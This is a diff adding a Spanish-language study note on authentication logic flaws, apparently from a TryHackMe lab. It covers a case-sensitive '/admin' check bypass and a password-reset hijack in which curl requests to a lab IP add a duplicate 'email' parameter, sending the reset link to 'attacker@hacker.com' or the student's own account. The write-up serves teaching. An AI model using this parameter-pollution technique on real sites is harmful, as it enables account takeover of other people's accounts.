@@ -3,3 +3,62 @@ layout: apunte
 title: "3. Logic Flaw"
 ---
 
+<h2>¿Qué es una Debilidad de Lógica?</h2>
+A veces los procesos de autentificación contienen fallos de lógica. Esto es cuando el flujo lógico típico de una aplicación es bypasseado, circunvalado o manipulado por un hacker. Los fallos de lógica pueden existir en cualquier parte de la web pero nos vamos a centrar en lo relacionado a la instancia de autentificación.
+
+!**Pasted image 20251103174206.png**
+
+---------------------------
+<h2>Ejemplo de Fallo Lógico</h2>
+El ejemplo de código de abajo comprueba si el comienzo de la ruta comienza con `/admin`. Si sí, hará más comprobaciones para ver si el usuario es de verdad el administrador. Si no, muestra la página al usuario:
+
+```php
+if( url.substr(0,6) === '/admin') {
+    # Code to check user is an admin
+} else {
+    # View Page
+}
+```
+
+Gracias a que el código PHP de arriba usa tres signos de igualdad (= = =), está buscando un match exacto de la string incluyendo mayúsculas y minúsculas. El código presenta un fallo lógico porque si un usuario busca `/adMin` no se comprobarán sus privilegios y se mostrará la página, bypasseando así el código de verificación de autentificación.
+
+-----------------------
+<h2>Ejemplo Práctico de Fallos Lógico</h2>
+Vamos a examinar la función de **Reset Password** en la página de Acme. Vemos un formulario que pide un email asociado a una cuenta. Si metes un correo erróneo verás **"Account not found from supplied email address**.
+
+Vamos a usar el correo **robert@acmeitsupport.t**hm, que sí es aceptado. 
+
+!**Pasted image 20251103180001.png**
+
+Puedes estarte preguntando cual es la vulnerabilidad, si necesitas saber tanto el email del usuario y su nombre y además el link oara el cambio de contraseña se le manda a su correo.
+
+Se requiere ejecutar las siguientes peticiones curl en la máquina:
+
+```shell
+user@tryhackme$ curl 'http://10.10.7.252/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+```
+
+- `-H`: Para añadir headers adicionales.
+
+En la aplicación, la cuenta de usuario es recuperada mediante string query pero más tarde en la aplicación hay lógica que hace que el email se mande usando la información obtenida de `$_REQUEST`.
+
+Esta variable es un array que contiene información tecibida de la string query en la petición POST. Si la misma clave de nombre es usada para ambos (la string query y la información POST), si añadimos otro parámetro a la string, podemos decidir a dónde se manda el email de reset.
+
+```shell
+user@tryhackme$ curl 'http://10.10.7.252/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
+
+!**Pasted image 20251103184847.png**
+
+Para el siguiente paso, necesitas crear una cuenta en Acme. El correo está en el formato: "`{username}`**@customer .acmeitsupport.thm**".
+
+Ahora, reejecutamos la petición 2 con nuestro email de acme. Tendrás un ticket creado en tu sesión que contiene un link para loguearte como Robert.
+
+```shell
+user@tryhackme:~$ curl 'http://10.10.7.252/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=**{username}**@customer.acmeitsupport.thm'
+```
+
+1. !**Pasted image 20251103191348.png**
+2. !**Pasted image 20251103191451.png**
+3. !**Pasted image 20251103191523.png**
+
